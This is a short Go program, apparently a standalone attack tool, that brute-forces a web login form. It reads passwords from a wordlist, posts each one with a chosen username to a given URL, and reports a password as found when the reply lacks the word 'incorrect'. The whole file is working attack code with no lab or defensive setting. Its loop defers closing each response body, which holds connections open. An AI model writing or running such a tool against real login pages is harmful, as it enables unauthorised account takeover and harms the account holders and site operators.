package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	urlFlag := flag.String("url", "", "URL of the login page (required)")
	userFlag := flag.String("user", "", "Username or email to target (required)")
	wordlistFlag := flag.String("wordlist", "passwords.txt", "Path to the password wordlist file")

	flag.Parse()

	if *urlFlag == "" || *userFlag == "" {
		fmt.Println("Error: --url and --user flags are required.")
		flag.PrintDefaults()
		os.Exit(1)
	}

	file, err := os.Open(*wordlistFlag)
	if err != nil {
		fmt.Printf("[!] Error: Could not open file '%s': %v\n", *wordlistFlag, err)
		return
	}
	defer file.Close()

	fmt.Printf("[*] Starting brute force attack on user '%s' at URL %s\n", *userFlag, *urlFlag)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		fmt.Printf("[*] Trying password: %s\n", password)

		data := url.Values{}
		data.Set("email", *userFlag)
		data.Set("password", password)
		data.Set("login", "Login")

		resp, err := http.PostForm(*urlFlag, data)
		if err != nil {
			fmt.Printf("[!] Error on request for password '%s': %v\n", password, err)
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("[!] Error reading response for password '%s': %v\n", password, err)
			continue
		}

		if !strings.Contains(strings.ToLower(string(body)), "incorrect") {
			fmt.Printf("\n[+] SUCCESS! Password found!\n")
			fmt.Printf("    -> User: %s\n", *userFlag)
			fmt.Printf("    -> Password: %s\n", password)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("[!] Error while reading password file: %v\n", err)
	}

	fmt.Println("\n[-] Attack failed. The password is not in the list.")
}
